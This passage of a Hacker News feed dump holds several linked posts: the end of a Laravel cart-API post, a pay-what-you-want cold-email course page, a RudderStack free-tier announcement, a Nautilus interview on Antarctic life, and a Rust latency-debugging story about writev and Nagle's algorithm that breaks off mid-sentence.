</pre><p>At checkout we need a way to calculate the totals (tax, shipping, coupons etc):</p><pre spellcheck="false">Cart::calculateTotals();
</pre><h2>Implementing the Logic</h2><p>Once I was happy with the surface API, and we could do everything we'd need to to interact with the cart, now comes the task of actually making this imaginary API actually work! 😀</p><p>So now we get into the weeds of creating the DB table for the cart &amp; cart-items, getting an instance of a cart, storing the cart in the session (so guests can also have a cart) and dealing with all the edge cases. We'll get stuck in deep rabbit holes, but when we come out, our surface API will still be as beautiful as they were in our imagination, because we wrote that before going into the implementation. We made the implementation fit to our API, and not the other way around 👌.</p><h3>Takeaway</h3><p>I learnt a new way of developing software - start with the outside shell, make it look like your best dream, then implement the logic to get it to work. It's like designing the exterior of a car to your imagination, then building the engines to fit.</p><div contenteditable="false" data-layout="default"><p><img alt="Laravel Commerce" src="https://blog.yiddishe-kop.com/storage/canvas/images/G3Px9ZgxGE5BBGc6R2hiAJOPhfMShMk469N1lvgP.png"></p><p>Laravel Commerce</p></div><p>The above packages development is well underway, and is open-source on <a href="https://github.com/Yiddishe-Kop/laravel-commerce" rel="noopener noreferrer" target="_blank">GitHub</a>, and there's really nice <a href="https://laravel-commerce.yiddishe-kop.com/" rel="noopener noreferrer" target="_blank">documentation</a> too!</p>
      </div></div>]]>
            </description>
            <link>https://blog.yiddishe-kop.com/posts/imagination-driven-development</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069916</guid>
            <pubDate>Thu, 12 Nov 2020 14:03:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Cold Email for Interesting People]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25069895">thread link</a>) | @philipkiely
<br/>
November 12, 2020 | https://philipkiely.com/cefip/ | <a href="https://web.archive.org/web/*/https://philipkiely.com/cefip/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<div>
    <!--Intro-->
    <div>
        <p><img src="https://philipkiely.com/assets/img/cefip_hero_vertical.jpg" alt="Cold Email for Interesting People">
        </p>
    </div>
    <div>
        <h2>Cold Email for Interesting People</h2>
        <p>Whether you want a new job, to meet your heroes, a feature on someone's show, or a unique opportunity that the public doesn't know about, the best way to get it is simple: just ask for what you want. I built an international career from the middle of Iowa, thousands miles away from the action. If you're like me and don't have tons of connections, you'll need to cold-contact people who you've never met to get things started. This course equips you with specific tactics for writing successful cold emails and encourages you to take your shot.</p>
        <br>
        <h5>Video Introduction</h5>
        <p>In a short video, I discuss fundamental concepts relating to cold email including social proof, overcoming
            objections, and formulating a specific ask. <i>16 Minutes</i>.</p>
        <br>
        <h5>Handbook</h5>
        <p>The handbook walks step-by-step through the process of deciding to write a cold email, figuring out who to email, finding their contact information, writing a compelling first message, and closing the conversation. <i>31 Pages</i>.</p>
        <br>
        <h5>Six Annotated Examples</h5>
        <p>Go behind the scenes of my cold email success. I've annotated six examples from the past two years to share with you. Each example includes one or two emails, the context, and the
        payoff. For each email, I go through line-by-line and discuss the impact of the words and phrases. <i>48 Pages</i>.</p>
        <br>
    </div>
</div>
<hr>
<div>
    <div>
        <div>
            <div>
                <h2>Get Cold Email for Interesting People Today!</h2>
                
                <p>16 5-star ratings | Pay what you want | $0 Minimum</p>
                <p>Sahil Lavingia: "Cold emails work, when they're sent by interesting people."</p>
                <p><a href="https://gum.co/cefip/">Click Here to Buy Now on Gumroad</a>
            </p></div>
        </div>
    </div>
    <div>
        <blockquote data-theme="dark">
            <p lang="en" dir="ltr">Cold emails work, when they're sent by interesting people.</p>— Sahil (@shl) <a href="https://twitter.com/shl/status/1306575128277299201?ref_src=twsrc%5Etfw">September 17, 2020</a>
        </blockquote>
        
    </div>
</div>
<hr>
<!--ATA SECTION-->
<div>
    
    <div>
        <p><img src="https://philipkiely.com/assets/img/SeatedPortraitCropped.jpg" alt="Philip Kiely">
        </p>
    </div>
    <div>
        <div>
            <p>Hi, I'm Philip Kiely. I run <a href="https://pkandc.com/">Philip Kiely &amp; Company</a>, which means that I am many
                things to many people. Most often, I’m <a href="https://philipkiely.com/essays/gumroad_hom.html">running marketing</a> at <a href="https://gumroad.com/">Gumroad</a>, selling copies of <a href="https://philipkiely.com/wfsd">Writing for Software Developers</a>,
                working on the next big thing, fixing bugs of my own creation, finding and delighting clients, or running payroll
                through Venmo like a Real Business Person.</p>
            <p>You can find me around the internet, especially <a href="https://twitter.com/philip_kiely">Twitter</a>, <a href="https://news.ycombinator.com/user?id=philipkiely">Hacker News</a>, or <a href="https://www.indiehackers.com/philipkiely">Indie Hackers</a>. I write <a href="https://philipkiely.com/essays">essays</a>, <a href="https://philipkiely.com/essays">tutorials</a>, and <a href="https://philipkiely.com/notes">notes</a> on my own site and <a href="https://philipkiely.com/notes/posts.html">various other publications</a>. You may have heard me on <a href="https://www.se-radio.net/2020/09/episode-426-philip-kiely-on-writing-for-software-developers/">IEEE’s
                    Software Engineering Radio</a> or <a href="https://philipkiely.com/notes/appearances.html">another show</a>. My professional hobbies
                include appearing on podcasts and panels, sending cold emails, pretending that I can read a 10-K, and tweeting
                about business. I also enjoy playing D&amp;D, practicing martial arts, and reading whatever is nearby.</p>
        </div>
    </div>
</div>
<hr>
<!--FAQ SECTION-->
<div>
    <div>
        
        <h5>What is a cold email?</h5>
        <p>A cold email is sending an email to someone who you do not know, or do not know well. The "cold" in cold email doesn't
        refer to the tone (which should generally be warm, friendly, and professional), but rather to the lack of previous
        relationship.</p>
        <br>
        <h5>Am I an interesting person?</h5>
        <p>I think so! Whether or not someone is interesting is quite situational. For example, Tom Brady wouldn't be interested in
        hearing from me with ideas for plays to run, but a developer advocate might be interested in hearing from me with ideas
        for technical content. Being interesting isn't so much an attribute but an action, so anyone can be interesting to the right person in the right situation!</p>
        <br>
        <h5>Who is this course not for?</h5>
        <p>This isn't a course about copywriting for mass emails or other bulk outreach. It isn't about generating leads or making
        tons of LinkedIn connections with some boilerplate message. It is about thinking deeply about how to connect with
        individuals about mutually interesting things.</p>
        <br>
    </div>
    <div>
        <h5>How much should I pay?</h5>
        <p><i>Cold Email for Interesting People</i> is a pay-what-you-want product. You can pay any amount, even zero dollars, but I'd appreciate it if you paid for the product for both of our benefits. Paying for the product helps me run my business and makes you more invested in the content. You can also download for free, see if you like it, and then buy it again if you found it valuable.</p>
        <p>I did pay-what-you-want without a minimum to achieve <a href="https://en.wikipedia.org/wiki/Price_discrimination#First_degree">perfect price discrimination</a> and avoid <a href="https://en.wikipedia.org/wiki/Anchoring_(cognitive_bias)">price anchoring</a>. But, if you really want guidance, let's say that if twenty bucks isn't a big deal for you, you should pay about that much, but if twenty bucks is a big deal for you, you should pay five or grab it for free and not feel bad either way. If you know me personally, you get it for free.</p>
        <br>
        <h5>Is there a refund policy?</h5>
        <p>I have a 30-day no-questions-asked refund policy. If you don't like your purchase, let me know and I will refund your
            money. Because the product is pay-what-you-want, if you think you'd ask for a refund, I'd rather you just download for free because that saves us both time.</p>
        <br>
        <h5>What if I have another question?</h5>
        <p>Send me an email at <a href="mailto:philip@kiely.xyz">philip@kiely.xyz</a>.</p>
        <br>
    </div>
</div>
<!--END FAQ SECTION-->
<hr>
<div>
    <div>
        <div>
            <div>
                <h2>Get Cold Email for Interesting People Today!</h2>
                
                <p>16 5-star ratings | Pay what you want | $0 Minimum</p>
                <p>Watch the Video Introduction on YouTube</p>
                <p><a href="https://gum.co/cefip/">Click Here to Buy Now on
                    Gumroad</a>
            </p></div>
        </div>
    </div>
    <p>
        <iframe width="100%" height="315" src="https://www.youtube.com/embed/E4_WFCF4zLs" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
    </p>
</div>
<hr>
</div></div>]]>
            </description>
            <link>https://philipkiely.com/cefip/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069895</guid>
            <pubDate>Thu, 12 Nov 2020 14:02:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Launching RudderStack Cloud Free Tier]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069882">thread link</a>) | @soumyadeb
<br/>
November 12, 2020 | https://rudderstack.com/blog/start-building-a-better-cdp-for-free-with-rudderstack-cloud-free/ | <a href="https://web.archive.org/web/*/https://rudderstack.com/blog/start-building-a-better-cdp-for-free-with-rudderstack-cloud-free/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                                    <figure>
                        <img src="https://3od2tt2mz35tibwwgb36eab1-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/freetier.blog_.rs_.png" alt="" title="freetier.blog.rs">                    </figure>
                                
                                
                <section>
                    <div>
                        
<p>Today, we launched <a href="https://app.rudderlabs.com/signup?type=freetrial">RudderStack Cloud Free</a>, a no time limit, no credit card required, completely free tier of RudderStack Cloud. The driving force behind this is simple: we want you to try RudderStack, and RudderStack Cloud Free makes it easier than ever to do that. You receive the same great experience you get with RudderStack Cloud Pro, with the only limitation being a cap of 500,000 events per month (that’s roughly 10,000 monthly active users for most sites and apps). We are confident that if you try RudderStack, you will find value in it and love it.</p>











<h2>RudderStack’s Warehouse-First Approach is Better Than Other CDPs</h2>











<p>The whole point of your customer data platform (CDP) is to eliminate the customer data silos that are invariably created through your company’s use of a variety of common, popular marketing, sales, and product technologies. Every CDP <em>claims</em> to do this, and modern CDPs, like Segment, actually do this well, but they all have one glaring flaw in their approach. They create another customer data silo, because they store your data. That means you have a third-party data warehouse for your customer data in addition to your own data warehouse, where you store all of your historical data… including another copy of your customer data.</p>



<blockquote><p><strong>RudderStack’s warehouse-first approach fixes this flaw.</strong>&nbsp;</p></blockquote>



<p>RudderStack does not persist any of your customer data. RudderStack builds your CDP on your data warehouse, with support for cloud data warehouses like <a href="https://aws.amazon.com/redshift/">Amazon Redshift</a>, <a href="https://cloud.google.com/bigquery">Google BigQuery</a>, and <a href="https://www.snowflake.com/">Snowflake</a>. No more paying your CDP vendor a premium to store your data. No more concerns about whether your CDP vendor is keeping your customer data private and secure. No more crossing your fingers and hoping the BI, ML, or AI tools you already use and love work with your CDP. No more reliance on your CDPs black box for complex functions like identity stitching.</p>











<h2>RudderStack is Built for Developers</h2>











<p>The team that owns your data warehouse and data infrastructure should own your customer data stack too. At pretty much every company, that team primarily consists of developers. So we built RudderStack to be easy to use for devs.</p>



<div><p>RudderStack’s features are built API-first, so they can easily fit into your existing development processes. It offers <a href="https://docs.rudderstack.com/rudderstack-sdk-integration-guides">11 SDKs</a> in addition to <a href="https://docs.rudderstack.com/sources">source integrations</a> with popular cloud-based customer tools including <a href="https://looker.com/">Looker</a> and <a href="https://customer.io/">Customer.io</a>, so you can instrument and start ingesting customer data from all of your digital touchpoints. RudderStack also offers connections to over <a href="https://docs.rudderstack.com/destinations">60 destinations</a>, so you can route your customer data to all of the systems that need it&nbsp; – including popular event-streaming platforms like <a href="https://kafka.apache.org/">Apache Kafka</a>, data warehouses like Snowflake, cloud tools like <a href="https://amplitude.com/">Amplitude</a>, <a href="https://www.appsflyer.com/">AppsFlyer</a>, and many more.</p><p>RudderStack is <a href="https://docs.rudderstack.com/how-to-guides/rudderstack-migration-guide">fully compatible</a> with Segment’s API too. So, if you have already instrumented your digital touchpoints with Segment, you don’t have to go through the toil of reinstrumenting with RudderStack. Just update the configuration on your Segment SDKs and you’re done.</p><p>RudderStack is also open source (visit <a href="https://github.com/rudderlabs">RudderStack on GitHub</a>). So if you ever need to augment or modify your RudderStack, you can, and then, hopefully, you’ll contribute that back to the project, so others benefit from your work too.</p></div>











<h2>Start Building a Better CDP With RudderStack</h2>











<p>Start building a better, warehouse-first CDP that delivers complete, unified data to every part of your marketing and analytics stack. Sign up for <a href="https://app.rudderlabs.com/signup?type=freetrial">RudderStack Cloud Free</a> today.<br>Join our <a href="https://resources.rudderstack.com/join-rudderstack-slack">Slack</a> to chat with our team, check out our open source repos on <a href="https://github.com/rudderlabs">GitHub</a>, and follow us on social: <a href="https://twitter.com/RudderStack">Twitter</a>, <a href="https://www.linkedin.com/company/rudderlabs/">LinkedIn</a>, <a href="https://dev.to/rudderstack">dev.to</a>, <a href="https://rudderstack.medium.com/">Medium</a>, <a href="https://www.youtube.com/channel/UCgV-B77bV_-LOmKYHw8jvBw">YouTube</a>.</p>
                    </div>
                </section>
            </article><div>
                <div>
                                        <p><img src="https://3od2tt2mz35tibwwgb36eab1-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/Gavin-Headshot-20200907-08-Square.png">
                    </p>
                    <p><span>Gavin</span>
                                                                            <span>Johnson</span>
                                                                    </p>
                    
                </div>
                <p>
                                            Product Marketer at RudderStack. 
Ex-PMM at New Relic &amp; AT&amp;T. Ex-consultant at Deloitte. Ex-sys admin. (Sometimes) Ex-developer.                                    </p>
            </div></div>]]>
            </description>
            <link>https://rudderstack.com/blog/start-building-a-better-cdp-for-free-with-rudderstack-cloud-free/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069882</guid>
            <pubDate>Thu, 12 Nov 2020 14:01:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What You Can Learn from Living in Antarctica]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069843">thread link</a>) | @CapitalistCartr
<br/>
November 12, 2020 | http://m.nautil.us/issue/92/frontiers/what-you-can-learn-from-living-in-antarctica | <a href="https://web.archive.org/web/*/http://m.nautil.us/issue/92/frontiers/what-you-can-learn-from-living-in-antarctica">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			<p><span>J</span><a title="Bold" tabindex="-1" target="_blank"></a>oe Pettit is a person of contradictions. A lover of solitude who manages teams, an engineer who writes poetry and paints, a family man who spends several months a year on remote Antarctic glaciers, installing delicate scientific instruments. It’s a rare mixture of qualities to find anywhere in the world—except, perhaps, in Antarctica.</p><p>Indeed, these days Pettit’s job involves finding other engineers like him, assembling the crack teams that place ice-penetrating radar and other equipment at both poles of the Earth. It’s challenging work, but vital.</p><p>Pettit’s teams provide support and equipment to researchers studying polar glaciers. Glaciers are constantly in motion, flowing outward under the pressure of accumulated snow that compresses into glacial ice. Some glaciers flow as fast as several kilometers a year. They are also melting. As our climate warms, the planet’s ice sheets are vanishing faster than anyone expected, pouring meltwater into rising seas. Understanding glaciers is critical to predicting some of the most severe climate disturbances we face. Researchers need to know how fast glaciers move over different kinds of terrain, where and how they are becoming unstable, and how quickly they may collapse. Pettit makes that possible.</p><figure data-alt="Grunes_BREAKER-1"><img src="http://static.nautil.us/17914_8aef1343f7c60c2dee067172f139bfe0.png" width="733" alt=""><figcaption><span><strong>JACK OF ANTARCTIC TRADES:</strong> Joe Pettit found different jobs to make sure he had work each winter: engineer, research associate, head of glacier search and rescue.</span><span>Courtesy of Joe Pettit</span></figcaption></figure><p>For the past 30 years, Pettit has worked as an engineer and project manager. He first worked the busy summer season at McMurdo Station, the largest research base in Antarctica. Soon he began to work through the winter: eight months of nearly perpetual darkness, brutal cold, and fierce storms. He lived for months without sun, and fell in love with the polar night. He became McMurdo’s resident aurora chaser, reading up on the Southern Lights and alerting his colleagues when they could expect the most dazzling displays. He found different jobs to make sure he had work each winter: engineer, research associate, head of glacier search and rescue.<br></p><p>What does it take to survive—and love—a place like Antarctica? As many of us around the world prepare for our own long, socially distanced winters, Pettit has some wisdom to share. He offers it below in his own words.</p><p><b>Feel at home</b></p><p>I first went down to Antarctica in 1990. It came out of a job search. I was living in Colorado Springs and looking through want ads in the newspaper. I happened upon one for a company called Antarctic Support Associates. They were looking for an engineer and my background is in electrical engineering. The day I got there just happened to be my 30th birthday. It was a white-out. Super windy. As we came off the plane, people would grab our hand and put it on the shoulder of the person in front of us and say, “Just hang onto this guy and follow them over to the vehicle.” I thought “Yeah, this is it!” The next day the clouds lifted, and there’s the Royal Society Mountain Range, stretching about 60 miles out. It was stunning. I couldn’t believe it. I went down there not knowing what it was going to be like, because it didn’t fit in the framework of any of my previous experiences. I loved that part of it, I loved where I was, I loved the science and the work I was doing.</p><blockquote><p>If you expect it to be amazing and filled with new experiences, you end up looking for those experiences.</p> </blockquote><p><b>Follow the stars</b><br></p><p>To spend an entire year is the only way to experience Antarctica. It changes every day—the light, the people, their moods, the pace of life. From the summer to the winter, things slow down. It’s amazing to use the stars spinning overhead during the winter as a sundial, where by the position of stars you know what time of day or night it is. It’s been 30 years for me now, which is hard to imagine. But every year there will be something that happens, or something I see, and I’ll be like, “Yeah, this is why I keep coming back, this is where the magic is.” For me it’s just the majestic nature of the place, the fact it’s so remote, so austere, and yet so incredibly beautiful. The sense of the scale of Antarctica is what really touches me.</p><p><b>Have no expectations</b></p><p>You have to know what your expectations are. If you expect it to be hard, it’s going to be hard. If you expect it to be amazing and filled with new and interesting experiences, you end up looking for those experiences. People who are resourceful and come up with ways of managing changing conditions personally or professionally do better over the long haul. One thing that happens to the best of us is putting a departure date on the calendar. Inevitably you don’t make it out that day because the air strip needs to be adjusted or the plane can’t fly because the weather makes it impossible for the pilot to see anything. A lot of people really suffer with that. They lose it. But people who can make plans A, B, C, and D and not be bothered by the fact that the first three plans just went out the window do well. The flexible are the ones who do best in Antarctica.</p><figure data-alt=" Grunes_BREAKER-2"><img src="http://static.nautil.us/17916_5c43b9568403ee749d068633ddb3535c.png" width="733" alt=""><figcaption><span><strong>THE SCALE:</strong> Neumayer Channel is just one feature of Antarctica’s majesty. “The sense of the scale of Antarctica is what really touches me,” says Pettit.</span><span>Beth Simmons</span></figcaption></figure><p><b>Love to be alone</b><br></p><p>People who enjoy people, but at the same time are comfortable being alone, do best. There’s solitude and seclusion, and how you feel about that makes a difference. If you’re an introvert, you can manage well, though a lot of things, like meals, take place in a large-group setting. So if you’re an introvert you may feel awash in a sea of faces. People who are curious do well because everybody’s asking questions about the place and wondering about Antarctica. Being curious about the science, about each other, makes a difference. People comfortable being far away from home will stay there longer than people who aren’t.</p><p>It’s helpful to have hobbies. I fall on the artist side of things, so on my down time I do painting and drawing, photography, and music. People who like to be outdoors and hike or ski do really well. I’ve met people who stay in town or indoors as much as they can, and they tend to get more dour as time goes on. So being able to get out and actually immerse yourself in the experience of the place is really important. I wintered with a woman once who was a hair stylist. She was going to stay in Building 155, where the dining facility is, and most of the administration and recreation departments, her entire winter. She thought, “That’s going to be my challenge.” And I thought, “What a loss!” She never saw an aurora, she never saw some of the beautiful things that happen during the winter. She met her challenge but it was to the detriment of completely missing the experience of Antarctica.</p><blockquote><p>If you’ve got a bunch of pessimists together, then nothing is going to happen other than misery.</p> </blockquote><p><b>Be optimistic</b><br></p><p>If you surround yourself with people who are optimistic, then you’ve got a really good team. If you’ve got a bunch of pessimists together, then nothing is going to happen other than misery. That’s a fact of life anywhere, but when you’re really on the margins, and things can go either way depending on which decision you make, coming at problems optimistically broadens the horizon of possible ideas you can come up with—as opposed to, “Oh, it’s just not going to work.” We work on equipment and instruments as if they’re going to be on the moon. There are no hardware stores. Once an instrument is out there, especially in the deep field, you can’t get back to it for a year or two. So you design and build and test things with the expectation that they have to work. You try to stack the deck in your favor in every way you can possibly imagine.</p><p><b>Appreciate luck</b></p><p>Once, we had a massive storm in June, which is midwinter. It was during an airdrop. Air Force planes would drop pallets full of food and mail out of the back of the plane, with parachutes, onto a designated drop zone. To get ready for the drop, you have to bring power to the zone, which in this case was a snowy runway. A crew would go out there and have runway lights on two sides of the drop zone. This storm was particularly horrendous. The crew driving out there should have stopped, but they kept going and it got worse. They couldn’t see the bamboo poles marking the road, and wandered off into the darkness. We had to go find them. The wind speed was so high it was roaring like a freight train. You had to get up to someone’s ear and yell at them to get any information past that roar. Suddenly, the wind went from 100 sustained knots to virtually zero. It just stopped all at once, and there was this fine haze of snow coming down. We called the lost supply van and asked, “You guys have a flashlight?” We told them to get up on top of the van and start spinning around in a circle. Sure enough, somebody spotted a light and we got a compass bearing on them. It was a lucky break. Sometimes you just have to rely on that luck and say, “You know, that’s good enough.”</p><p><i>Marissa Grunes is a postdoctoral fellow at the Harvard University Center for the Environment, where she is at work on a book about Antarctica.</i></p><p><i>Lead image:&nbsp;U.S. research outpost, Palmer Station, located on Anvers Island in Antarctica, where Joe Pettit has been manager of operations. Photo by Marie Zahn.</i></p><div>
<article>
<p><a href="http://m.nautil.us/issue/45/Power/ingenious-carl-erik-fisher" data-trval="ingenious-carl-erik-fisher" data-trlbl="foc_rec" data-tract="internal_art">
<img src="http://static.nautil.us/11746_604b37ea63ea51fa5fb3d8a89ec056e6.png" alt="Sapolsky_TH-F1" width="314" height="177">
</a>
</p>
<div>
<p><span>
<span>

<span><a href="http://m.nautil.us/term/f/Psychology">Also in Psychology</a></span>&nbsp;&nbsp;</span>
</span></p><h4><a href="http://m.nautil.us/issue/45/Power/ingenious-carl-erik-fisher" data-trval="ingenious-carl-erik-fisher" data-trlbl="foc_rec" data-tract="internal_art">Ingenious: Carl Erik Fisher</a></h4>
<p>By Michael Segal</p>
<p>
The reactions to Carl Fisher’s Nautilus essay, “Against Willpower,” ranged from the appreciative to the sorely defensive. Why should we be asked to give up the idea of willpower? Aren’t we just giving ourselves and others permission to fail? Is...<strong><a href="http://m.nautil.us/issue/45/Power/ingenious-carl-erik-fisher" data-trval="ingenious-carl-erik-fisher" data-trlbl="foc_rec" data-tract="internal_art">READ MORE</a></strong>
</p>

</div>

</article>
</div>
			



						
			

		</div></div>]]>
            </description>
            <link>http://m.nautil.us/issue/92/frontiers/what-you-can-learn-from-living-in-antarctica</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069843</guid>
            <pubDate>Thu, 12 Nov 2020 13:56:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[40ms bug: a missing writev, Nagle's algorithm, and delayed ACKs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069734">thread link</a>) | @fanf2
<br/>
November 12, 2020 | https://vorner.github.io/2020/11/06/40-ms-bug.html | <a href="https://web.archive.org/web/*/https://vorner.github.io/2020/11/06/40-ms-bug.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
      <section id="main_content">
        

<p>This is a small story about tracking down a production bug in a Rust
application. I don’t know if there’s any take away from this one for the reader,
but it felt interesting so I’m sharing it.</p>

<h2 id="a-bit-of-backstory">A bit of backstory</h2>

<p>In Avast, we have a Rust application called <a href="https://vorner.github.io/2019/05/19/rust-in-avast.html">urlite</a>. It serves as a backend to
some other applications, provides them a HTTP API. It’s in Rust because it is
latency critical. Latencies of most requests are under a millisecond.</p>

<p>It was written with <a href="https://docs.rs/tokio/0.1.*"><code>tokio-0.1</code></a> and <a href="https://docs.rs/hyper/0.12.*"><code>hyper-0.12</code></a> to deal with the HTTP. We
were quite late to update to newer versions, in part because it worked fine and
the amount of <code>async</code> code was single quite short function, so we didn’t have
much motivation. And in part because we use the <a href="https://crates.io/crates/spirit"><code>spirit</code></a> libraries for
configuration. It’s a library to take configuration and set up the internal
state of the program for it ‒ configuration contains the ports to listen to,
etc, and it manages spawning the HTTP server objects inside the program and can
even migrate from one set of ports to other at runtime.</p>

<p>But migrating <a href="https://crates.io/crates/spirit"><code>spirit</code></a> to newer <code>tokio</code> and <code>hyper</code> was a big task (because
the API surface is quite large, the library does a bit unusual things compared
to all the usual applications and the change between old and new <code>tokio</code> was
quite large).</p>

<p>Anyway, eventually I got permission to work on the migration of <a href="https://crates.io/crates/spirit"><code>spirit</code></a> as
part of my job. It took about a week to migrate both <a href="https://crates.io/crates/spirit"><code>spirit</code></a> and <a href="https://vorner.github.io/2019/05/19/rust-in-avast.html">urlite</a>. It
went through review, went through the automatic tests and we put it to the
staging environment for a while, watching the logs and graphs. Everything seemed
fine, so after few days of everything looking fine, we pushed the button and put
it to production.</p>

<h2 id="the-increased-latencies">The increased latencies</h2>

<p>As it goes in these kinds of stories, by now you’re expecting to see what went
wrong.</p>

<p>The thing is, our own metrics and graphs were fine. But the latency on the
downstream service querying us increased by 40ms. The deployment got reverted,
and we started to dig into where these latencies come from.</p>

<h2 id="it-was-acting-really-weird">It was acting really weird</h2>

<p>There were several very suspicious things about that.</p>

<ul>
  <li>Our own „internal“ latencies stayed the same. Our CPU usage also stayed the
same.</li>
  <li>The latency graph on the downstream side was flat 40ms <em>constant</em>.</li>
</ul>

<p>Now, if we introduced some performance regression in the query handling, we
would expect our CPU consumption to rise. We would also expect the latency graph
to be a bit spiky, not completely flat 40ms constant. It almost looked like
there was a 40ms <code>sleep</code> somewhere. But why would anyone put a 40ms sleep
anywhere?</p>

<p>I’ve looked through documentation and didn’t see anything obvious. I’ve tried
searching both our code and code of the dependencies for <code>40</code>, asked on Slack if
that <code>40ms</code> value was familiar to anyone. Nothing.</p>

<p>The working theory we started with was that there could be some kind of back-off
sleep on some kind of failure. Maybe <code>hyper</code> would be closing inactive
connections in the new version, forcing the application to reconnect (the graph
was for 99th percentile, so if we happened to close each 100th connection and
reconnection took this long…) and maybe try IPv6 first and we would be listening
on IPv4 only or… (in other words, we didn’t have a clear clue).</p>

<h2 id="the-benchmarks">The benchmarks</h2>

<p>My colleague started to investigate in a more thorough way than just throwing
ideas around on Slack. He run a <code>wrk</code> benchmark against the service. On his
machine, the latencies were fine. So he commandeered one of the stage nodes to
play with it and run the benchmark there. And every request had 40ms latency on
that machine. The previous version of <code>urlite</code> was fine, with under one
millisecond.</p>

<p><em>Something</em> was probably sleeping somewhere on the production servers, but not
on the development machine. There probably was some difference in the OS
settings, but definitely difference in the kernel version. The servers are
running some well-tried Linux distribution, so they have a lot older version,
while a developer is likely to run something much more on the edge.</p>

<h2 id="configuration-options">Configuration options</h2>

<p>The selling point of <a href="https://crates.io/crates/spirit"><code>spirit</code></a> is that most of the thing one can set in the
builders of various libraries and types now can be just put into a config file
without any recompilation. If we did configuration by hand, we would expose only
the things we thought would be useful, but with spirit, there’s everything. So,
naturally, tweaking some of the config knobs was the next step (because it was
easy to do).</p>

<p>It was discovered that turning the <code>http1-writev</code> option <em>off</em>, which
corresponds to
<a href="https://docs.rs/hyper/0.13.8/hyper/server/struct.Builder.html#method.http1_writev">this method</a>
in <code>hyper</code>, made the latencies go away.</p>

<p>We now had a solution, but I wasn’t happy about not understanding <em>why</em> that
helped, so I went to dig the rabbit hole and find the root cause. Turns out
there were several little things in just the constellation to make the problem
manifest.</p>

<h2 id="overriding-the-defaults-of-http1_writev">Overriding the defaults of <code>http1_writev</code></h2>

<p>The method controls the strategy in which way data are pushed into the socket.
With vectored writes enabled, it sends two separate buffers (one with headers,
the other with the body if it’s small enough) through a single <a href="https://linux.die.net/man/2/writev"><code>writev</code></a>
syscall.  If they are disabled, <code>hyper</code> copies all the bytes into a single
buffer and sends that as a whole.</p>

<p>It turns out that the method takes a <code>bool</code>, but there are actually 3 states.
The third (auto) is signalled by <em>not</em> calling the method and <code>spirit-hyper</code> was
calling it always, with the default to turn the <a href="https://linux.die.net/man/2/writev"><code>writev</code></a> on. I don’t know if
leaving it on auto would make the bug go away, but I’ve fixed the problem in the
library anyway.</p>

<h2 id="splitting-vectored-writes">Splitting vectored writes</h2>

<p>Spirit wants to support a bit of configuration on top of what the underlying
libraries provide on their own. One of such things is limiting the number of
concurrently accepted connections on a single listening socket. Users don’t have
to take advantage of that (the types for the configuration can be composed
together to either contain that bit or not and the administrator may leave the
values for the limits unset in the configuration and then they won’t be
enforced).</p>

<p>Anyway, in case the support for the limits is opted in through using the type
with the configuration fields, the connections themselves are wrapped in a
<a href="https://docs.rs/spirit-tokio/0.7.*/spirit_tokio/net/limits/struct.Tracked.html"><code>Tracked</code></a>
type. The type tries to be mostly transparent for use and can be used inside
<code>hyper</code> (which is what the default configuration type alias in <code>spirit-hyper</code>
does), but tracks how many connections there are, to not accept more if it runs
out of the limit.</p>

<p>When implementing the bunch of traits for the wrapper, I’ve overlooked the
<a href="https://docs.rs/tokio/0.2.*/tokio/io/trait.AsyncWrite.html#method.poll_write_buf"><code>AsyncWrite::poll_write_buff</code></a>.
It is a provided method, which means it has a default implementation. It is the
one that abstracts the OS-level <code>writev</code>, it can write multiple buffers (the
<a href="https://docs.rs/bytes/0.5.*/bytes/buf/trait.Buf.html"><code>Buf</code></a> represents a
segmented buffer).</p>

<p>The default implementation simply delegates to multiple calls to the ordinary
write. Therefore, this omission combined with the default of enabling vectored
writes results in calling into the kernel twice, each time with a small buffer,
instead of once with two small buffers or once with a big buffer.</p>

<p>That was definitely something to get fixed, because if nothing else, syscalls
are expensive and calling more of them is not great. But I’ve finally felt like
I’m on the right path, because:</p>

<h2 id="nagles-algorithm">Nagle’s algorithm</h2>

<p>You probably know that TCP stream is built from packets going there and back.
Optimizing how to split the stream into the packets and when to send them is a
hard problem and the research in that area is still ongoing, because there are
many conflicting requirements. One wants to deliver the data with low latency,
utilize the whole bandwidth, but not overflow the capacity of the link (in which
case the latencies would go up or packets would get lost and would have to be
retransmitted), leave some bandwidth to other connections, etc.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Nagle%27s_algorithm">Nagle’s algorithm</a> is
one of the older tricks up in TCP’s sleeve. The network doesn’t like small
packets.  It is better to send as large packets as the link allows, because each
packet has certain overhead ‒ the headers that take some space, but also routers
spend computation power mostly based on number of packets and less on their
size. If you start sending a lot of tiny packets, the performance will suffer.
While the links are limited by the number of bytes that can pass through them,
routers are more limited by the number of packets. If a router declares to be
able to handle a gigabit connection, it actually means a gigabit <em>if you use
full-sized packets</em>, but will get to few megabits if you split the data into
tiny packets.</p>

<p>So it would be better to wait until the send buffer contains a packetfull of
data before sending anything. But we can’t do that, because we don’t <em>know</em>
